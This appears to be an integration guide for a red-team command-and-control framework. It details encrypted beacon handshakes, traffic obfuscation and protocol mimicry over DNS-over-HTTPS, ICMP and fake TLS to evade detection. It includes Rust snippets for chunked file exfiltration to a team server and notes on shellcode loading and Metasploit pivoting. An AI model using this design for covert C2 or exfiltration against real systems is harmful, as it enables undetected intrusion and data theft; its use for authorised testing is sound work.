# WRAITH-RedOps Integration Guide

**Document Version:** 1.1.0
**Last Updated:** 2025-11-29
**Classification:** Reference Architecture
**Governance:** See [Security Testing Parameters](../../../ref-docs/WRAITH-Security-Testing-Parameters-v1.0.md)

---

## 1. Interoperability Overview

WRAITH-RedOps is designed to work alongside industry-standard tools. While it provides a complete C2 framework built on the WRAITH protocol stack, it can ingest standard formats (BOF, Shellcode) and export data to reporting platforms.

The integration architecture leverages WRAITH's six-layer protocol stack to provide:
- **Secure C2 Channels:** Noise_XX handshake with XChaCha20-Poly1305 AEAD encryption
- **Traffic Obfuscation:** Elligator2 key encoding, adaptive padding, protocol mimicry
- **Network Resilience:** AF_XDP kernel bypass, multi-path routing, relay support
- **Forward Secrecy:** Continuous key ratcheting (symmetric + DH)
- **Protocol Flexibility:** UDP, TCP, HTTPS, DNS, WebSocket, ICMP covert channels

---

## 2. WRAITH Protocol Stack Integration

### 2.1 wraith-core Integration (Session Management)

**Purpose:** Session state management, stream multiplexing, and frame construction for C2 channels.

**Key Features:**
- **Connection ID (CID) Management:** 64-bit rotating CIDs prevent tracking
  ```
  initial_cid = BLAKE3(shared_secret || "connection-id")[0..8]
  rotating_cid = initial_cid[0..4] || (initial_cid[4..8] XOR seq_num)
  ```
- **Frame Construction:** 28-byte fixed header + encrypted payload + random padding
  - Nonce (64-bit): Session salt (32-bit) + Packet counter (32-bit)
  - Frame Type (8-bit): DATA, ACK, CONTROL, REKEY, PING/PONG, CLOSE, PAD
  - Stream ID (16-bit): Multiplexed C2 channels per beacon
  - Sequence Number (32-bit): Ordered delivery, loss detection
  - File Offset (64-bit): Used for data transfer or repurposed per frame type

**C2 Application:**
- Each beacon maintains 1-3 streams: Command channel, File transfer, SOCKS proxy
- Control frames manage beacon lifecycle (checkin, sleep, kill)
- ACK frames ensure reliable task delivery
- REKEY frames trigger forward secrecy ratcheting

**Integration Pattern:**
```rust
use wraith_core::{Session, StreamId, Frame, FrameType};

// Establish C2 session
let mut session = Session::new(beacon_id, server_keypair);
let cmd_stream = session.open_stream(StreamId::CLIENT_INITIATED)?;

// Send tasking
let task_frame = Frame {
    frame_type: FrameType::DATA,
    stream_id: cmd_stream,
    payload: encrypted_task,
    flags: Flags::ACK_REQUIRED,
    ..Default::default()
};
session.send_frame(task_frame)?;
```

### 2.2 wraith-crypto Integration (Cryptographic Primitives)

**Purpose:** Secure C2 channel establishment, message encryption, and continuous forward secrecy.

**Cryptographic Suite:**
| Function | Algorithm | Parameters | C2 Use Case |
|----------|-----------|------------|-------------|
| Key Exchange | X25519 | 128-bit security | Beacon handshake |
| Key Encoding | Elligator2 | ~50% success rate | Hide handshake in noise |
| AEAD | XChaCha20-Poly1305 | 256-bit key, 192-bit nonce | Encrypt all C2 traffic |
| Hash | BLAKE3 | 256-bit output | Task IDs, artifact hashing |
| KDF | HKDF-BLAKE3 | Standard params | Session key derivation |
| Signatures | Ed25519 | 128-bit security | Team Server auth (optional) |

**Noise_XX Handshake for C2:**
```
Phase 1: Beacon → Server (Ephemeral key, Elligator2 encoded)
    [CID: 0xFFFFFFFFFFFFFFFF][Ephemeral PubKey: 32B][Padding: 28B][MAC: 16B]

Phase 2: Server → Beacon (Ephemeral + Static, encrypted)
    [CID: derived][Ephemeral PubKey: 32B][Encrypted: Static Key + Timestamp + Tag]

Phase 3: Beacon → Server (Static, encrypted)
    [CID: derived][Encrypted: Static Key + Session Params + Tag]

Result: Mutual authentication, identity hiding, forward secret session keys
```

**Session Key Derivation:**
```
IKM = DH(ie, re) || DH(ie, rs) || DH(is, re) || DH(is, rs)  // 128 bytes
PRK = HKDF-Extract(salt="protocol-v1", IKM)

beacon_send_key = HKDF-Expand(PRK, "b2s-data", 32)
server_send_key = HKDF-Expand(PRK, "s2b-data", 32)
beacon_nonce_salt = HKDF-Expand(PRK, "b2s-nonce", 4)
server_nonce_salt = HKDF-Expand(PRK, "s2b-nonce", 4)
```

**Forward Secrecy Ratcheting:**
- **Symmetric Ratchet (per-packet):**
  ```
  chain_key[n+1] = BLAKE3(chain_key[n] || 0x01)
  message_key[n] = BLAKE3(chain_key[n] || 0x02)
  zeroize(chain_key[n], message_key[n])  // Immediate wipe
  ```
- **DH Ratchet (time/volume triggered):**
  - Trigger: Every 2 minutes OR 1,000,000 packets
  - New ephemeral key exchange via REKEY frame
  - Post-compromise security: Recovery after key compromise

**Integration Pattern:**
```rust
use wraith_crypto::{NoiseHandshake, AeadCipher, KeyRatchet};

// Beacon-side handshake
let (beacon_static, _) = generate_elligator_keypair();
let mut handshake = NoiseHandshake::initiator(beacon_static);

// Phase 1: Send ephemeral key
let phase1_msg = handshake.write_message(&[])?;
send_to_server(phase1_msg);

// Phase 2: Receive server response
let phase2_msg = receive_from_server();
handshake.read_message(&phase2_msg)?;

// Phase 3: Complete handshake
let phase3_msg = handshake.write_message(&beacon_metadata)?;
send_to_server(phase3_msg);

// Extract transport keys
let (send_cipher, recv_cipher) = handshake.into_transport_mode()?;
```

### 2.3 wraith-transport Integration (Network Layer)

**Purpose:** Multi-mode network transport optimized for stealth and performance.

**Transport Modes:**
| Mode | Throughput | Latency | OS Support | C2 Use Case |
|------|-----------|---------|------------|-------------|
| AF_XDP | 10-40 Gbps | <1 ms | Linux 4.18+ | High-volume exfiltration |
| io_uring | 1-5 Gbps | 1-5 ms | Linux 5.1+ | Fast file transfers |
| UDP (standard) | 300+ Mbps | <10 ms | Cross-platform | Default C2 channel |
| TCP | 500+ Mbps | <20 ms | Cross-platform | Firewall-friendly |
| HTTPS/TLS | 200+ Mbps | <50 ms | Cross-platform | Corporate egress |
| DNS | 10-50 Kbps | 100-500 ms | Universal | Covert fallback |
| ICMP | 50-100 Kbps | 50-200 ms | Most networks | Alternate covert |
| WebSocket | 300+ Mbps | <30 ms | Web-capable | Browser-based pivot |

**AF_XDP Architecture (Linux Beacons):**
```
┌──────────────────────────────────────────────────────────┐
│                Network Interface Card (NIC)              │
└────────────────────┬─────────────────────────────────────┘
                     │ Hardware RX Queue
                     ▼
              ┌────────────────┐
              │  XDP Program   │ (eBPF filter: accept C2 traffic)
              │  (Kernel)      │
              └────────┬───────┘
                       │ Zero-copy DMA
                       ▼
              ┌────────────────┐
              │  UMEM Region   │ (Shared memory buffer)
              │  (User Space)  │
              └────────┬───────┘
                       │
                       ▼
              ┌────────────────┐
              │  Beacon Logic  │ (Process packets without kernel stack)
              │  (Spectre)     │
              └────────────────┘
```

**UDP Fallback (Cross-Platform):**
- Standard Berkeley sockets API
- Socket options: SO_REUSEADDR, SO_REUSEPORT
- Non-blocking I/O with edge-triggered polling
- Congestion control: BBRv2-inspired algorithm

**Relay Network (NAT Traversal):**
- **DERP-style relay:** End-to-end encrypted, relay-blind forwarding
- **Relay protocol:** Routes by beacon public key, not IP
- **Multi-hop support:** Up to 3 relay hops for deep NAT scenarios
- **Automatic failover:** Beacon tries direct → relay → DNS covert

**Integration Pattern:**
```rust
use wraith_transport::{TransportMode, UdpTransport, AfXdpTransport};

// Configure transport for beacon
let transport = match target_os {
    "linux" if has_af_xdp_support() => {
        TransportMode::AfXdp(AfXdpTransport::new(interface, umem_size)?)
    },
    _ => {
        TransportMode::Udp(UdpTransport::new(bind_addr)?)
    }
};

// Send C2 packet
let encrypted_frame = aead_cipher.encrypt(frame_bytes, nonce)?;
transport.send_to(encrypted_frame, server_addr)?;
```

### 2.4 wraith-obfuscation Integration (Traffic Analysis Resistance)

**Purpose:** Make C2 traffic indistinguishable from benign protocols.

**Obfuscation Techniques:**

**1. Elligator2 Key Encoding:**
- All ephemeral public keys appear as uniform random bytes
- ~50% of curve points are encodable (acceptable retry cost)
- High bit randomization prevents structural fingerprinting

**2. Adaptive Padding:**
```
Padding Class Selection (C2 Context):
├─ Tiny (64B):     Control frames (sleep, kill, nop)
├─ Small (256B):   ACKs, short responses
├─ Medium (512B):  Small file chunks, keylog data
├─ Large (1024B):  Screenshot fragments
├─ MTU (1472B):    Maximum UDP efficiency
└─ Jumbo (8960B):  High-volume exfiltration
```

**Padding Modes:**
- **Performance:** Minimal padding (next power of 2)
- **Privacy:** Random class selection
- **Stealth:** Match observed benign traffic distribution

**3. Timing Obfuscation:**
```rust
// Exponential distribution for inter-packet delay
fn calculate_send_delay(jitter_percent: u8) -> Duration {
    let base_sleep = Duration::from_millis(sleep_interval_ms);
    let lambda = 1.0 / (base_sleep.as_secs_f64() * (jitter_percent as f64 / 100.0));
    let delay_ms = -1.0 / lambda * random_f64().ln();
    Duration::from_secs_f64(delay_ms / 1000.0)
}
```

**4. Protocol Mimicry Profiles:**

**TLS 1.3 Mimicry:**
```
Outer Wrapper:
[Content Type: 0x17 (Application Data)][TLS Version: 0x0303][Length: 2B]
[Encrypted WRAITH Frame]

Handshake:
- Mimic Chrome/Firefox TLS ClientHello (JA3 fingerprint)
- Valid cipher suites, extensions (SNI, ALPN, supported_groups)
- Server response mimics legitimate TLS 1.3 ServerHello
```

**DNS-over-HTTPS Covert Channel:**
```
C2 Data Encoding:
POST https://1.1.1.1/dns-query
Content-Type: application/dns-message

DNS Query:
  QNAME: <base32(encrypted_task_chunk)>.beacon-id.tunnel.example.com
  QTYPE: TXT

DNS Response (from Team Server):
  TXT Record: <base32(encrypted_result_chunk)>

Bandwidth: ~100-500 bytes/query, 10-50 queries/second
Stealth: Blends with legitimate DoH traffic
```

**WebSocket Mimicry:**
```
Initial HTTP Upgrade:
GET /api/notifications HTTP/1.1
Host: legitimate-cdn.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: <random>
Sec-WebSocket-Version: 13

WebSocket Frame (Binary):
[FIN=1, RSV=000, Opcode=0x2][MASK=1][Payload Len][Mask Key: 4B]
[Masked WRAITH Frame]
```

**ICMP Covert Channel:**
```
ICMP Echo Request/Reply:
[Type: 8/0][Code: 0][Checksum: 2B][ID: 2B][Seq: 2B]
[Payload: WRAITH Frame embedded in ICMP data field]

Stealth:
- Payload size matches typical ping patterns (56-64 bytes)
- Sequence numbers increment normally
- Checksum always valid
```

**5. Cover Traffic Generation:**
- Minimum baseline: 10 packets/second
- Maximum idle gap: 100ms
- PAD frames during low activity
- Match expected application behavior (e.g., keepalives)

**Integration Pattern:**
```rust
use wraith_obfuscation::{PaddingMode, TimingMode, MimicryProfile};

// Configure obfuscation for C2 channel
let obfuscation_config = ObfuscationConfig {
    padding: PaddingMode::Stealth,  // Match HTTPS distribution
    timing: TimingMode::HighPrivacy(jitter_percent: 30),
    mimicry: MimicryProfile::Tls13Chrome,
    cover_traffic: CoverTrafficConfig {
        min_rate_pps: 10,
        max_idle_ms: 100,
    },
};

// Apply obfuscation to outbound frame
let obfuscated_packet = obfuscator.wrap_frame(
    encrypted_frame,
    &obfuscation_config,
    &mimicry_profile,
)?;
```

### 2.5 wraith-discovery Integration (Beacon Coordination)

**Purpose:** Facilitate peer-to-peer beacon communication and relay coordination.

**DHT-Based Peer Discovery:**
- **Privacy-Enhanced Kademlia:** Encrypted announcements, unlinkable keys
- **Key Derivation:**
  ```
  beacon_dht_key = BLAKE3(group_secret || beacon_id || "peer")[0..20]
  ```
- **Announcement Format:** Encrypted with group key, signed by beacon
- **Use Case:** Beacons discover relay nodes or peer beacons for lateral C2

**Relay Network Coordination:**
- **Relay Registration:** Beacons subscribe to relay using public key
- **Relay Routing:** Relay forwards by destination public key (blind)
- **Multi-Hop Support:** Beacons can chain through 3 relays for deep NAT

**P2P C2 Architecture:**
```
Team Server (Internet)
     │
     ├─ WRAITH/UDP ────────▶ Gateway Beacon (DMZ)
     │                            │
     │                            ├─ SMB Pipe ──▶ Internal Beacon A
     │                            │                      │
     │                            └─ TCP Socket ─▶ Internal Beacon B
     │                                                    │
     └─ Relay (Fallback) ─────────────────────────────────┘
```

**Integration Pattern:**
```rust
use wraith_discovery::{DhtAnnouncement, RelayClient};

// Beacon announces to DHT (for peer discovery)
let announcement = DhtAnnouncement {
    endpoints: vec![beacon_public_addr],
    capabilities: Capabilities::P2P_PARENT,
    timestamp: SystemTime::now(),
};
dht_client.announce(beacon_dht_key, announcement)?;

// Beacon connects through relay
let relay_client = RelayClient::connect(relay_addr, beacon_keypair)?;
relay_client.subscribe(beacon_public_key)?;  // Register for incoming
```

### 2.6 wraith-files Integration (Data Exfiltration)

**Purpose:** Efficient, integrity-verified data exfiltration.

**Chunking Strategy:**
- Default chunk size: 256 KiB
- BLAKE3 hash per chunk (16-byte truncated)
- Parallel transmission from multiple sources

**Integrity Verification:**
```
Per-Chunk Hash:
  chunk_hash = BLAKE3(chunk_data)[0..16]  // Transmitted in DATA frame

Final File Hash:
  file_hash = BLAKE3_tree_hash(all_chunks)  // Verified at Team Server
```

**Multi-Path Exfiltration:**
- Chunk 1 → DNS covert channel
- Chunk 2 → HTTPS egress
- Chunk 3 → ICMP tunnel
- Reassembly at Team Server with sequence validation

**Compression (Optional):**
- LZ4 compression (Flags.CMP set in frame)
- Adaptive: Only compress if ratio > 20%
- Decompression at Team Server before integrity check

**Integration Pattern:**
```rust
use wraith_files::{Chunker, IntegrityVerifier};

// Beacon-side: Chunk and exfiltrate file
let file_data = read_target_file(path)?;
let chunks = Chunker::new(file_data, chunk_size: 256_KiB);

for (chunk_id, chunk_data) in chunks.enumerate() {
    let chunk_hash = BLAKE3::hash(&chunk_data)[0..16];
    let frame = Frame {
        frame_type: FrameType::DATA,
        stream_id: exfil_stream,
        file_offset: chunk_id * 256_KiB,
        payload: chunk_data,
        metadata: chunk_hash,
        ..Default::default()
    };
    session.send_frame(frame)?;
}

// Team Server-side: Reassemble and verify
let mut reassembler = FileReassembler::new(total_size);
reassembler.add_chunk(chunk_id, chunk_data, chunk_hash)?;
if reassembler.is_complete() {
    let file_data = reassembler.finalize()?;
    let file_hash = BLAKE3::hash(&file_data);
    assert!(file_hash == expected_hash);  // Integrity verification
}
```

### 2.7 External Tool Integration Patterns

**MITRE ATT&CK Framework Mapping:**
- All beacon capabilities mapped to ATT&CK techniques
- Campaign planning references specific TTP IDs
- Automated ATT&CK navigator layer generation

**SIEM Integration:**
- Team Server exports logs in CEF (Common Event Format)
- Splunk/Elastic ingestion via HTTP Event Collector
- Real-time activity correlation with defensive logs

**Threat Intelligence Sharing:**
- IOC generation: Beacon hashes, C2 IPs, DNS domains
- STIX/TAXII format export for threat intel platforms
- Responsible disclosure coordination

---

## 3. Tool Compatibility

### 3.1 Cobalt Strike / Slytherin
*   **BOF Compatibility:** Spectre implants implement the standard Beacon API (`BeaconPrintf`, `BeaconVirtualAlloc`), allowing you to run existing `.o` BOF files from the community.
*   **Shellcode Loader:** The "Injector" module can load standard x64 shellcode generated by msfvenom or Cobalt Strike.

### 3.2 Metasploit Framework
*   **SOCKS Proxy:** Spectre exposes a SOCKS4a server on the Team Server.
*   **Integration:**
    1.  Connect Metasploit to Team Server SOCKS port.
    2.  `set PROXIES socks4:127.0.0.1:1080`.
    3.  Run `auxiliary/scanner/...` through the beacon.

---

## 4. Automation & Reporting

### 4.1 Vector / Ghostwriter
*   **Log Export:** WRAITH-RedOps can export engagement logs in a format compatible with Vector (Red Team reporting tool).
*   **Format:** GraphQL or CSV import.

### 4.2 Caldera Integration
*   **Agent:** WRAITH can be used as a transport for Caldera agents, wrapping their HTTP traffic in WRAITH's encrypted UDP stream.

---

## 5. Performance Optimization Patterns

### 5.1 Thread-Per-Core Model

WRAITH-RedOps follows a thread-per-core architecture for maximum performance:

**Team Server Threading:**
- **Listener Thread:** One per transport (UDP, TCP, HTTPS)
- **Session Worker Pool:** Thread-per-core (pinned to CPU cores)
- **Database Thread:** Dedicated thread for PostgreSQL writes
- **gRPC Server:** Tokio runtime with work-stealing scheduler

**Performance Characteristics:**
- No locks in hot path (session processing)
- NUMA-aware memory allocation
- Zero-copy packet forwarding where possible
- Lock-free queues for inter-thread communication

**Integration Pattern:**
```rust
// Pin session to specific CPU core
use core_affinity;

let core_id = beacon_id % num_cpus;
core_affinity::set_for_current(core_id);

// Process beacon traffic on pinned thread
loop {
    let packet = recv_queue.pop()?;
    let session = sessions.get_mut(&packet.cid)?;
    session.process_packet(packet)?;
}
```

### 5.2 BBR Congestion Control

WRAITH uses BBRv2-inspired congestion control for C2 channels:

**BBR States:**
- **STARTUP:** Exponential probing to discover bandwidth
- **DRAIN:** Reduce in-flight packets to BDP
- **PROBE_BW:** Steady state with periodic probing
- **PROBE_RTT:** Measure minimum RTT every 10 seconds

**C2-Specific Tuning:**
- Lower pacing gain during sleep intervals (stealth mode)
- Aggressive probing during active tasking (performance mode)
- Adaptive based on network conditions

---

## 6. API Reference (Team Server)

The Team Server exposes a gRPC API for custom clients or automation scripts.

**Service:** `RedOpsController`
**Port:** `50051` (Default)

**Methods:**
*   `GetBeacons(Filter)`: List active agents.
*   `TaskBeacon(BeaconID, Task)`: Queue a command.
*   `RegisterListener(Config)`: Start a new C2 listener.
*   `GetGraph()`: Return the P2P topology as JSON.

**Authentication:**
Requires mTLS certificates issued by the Team Server CA.
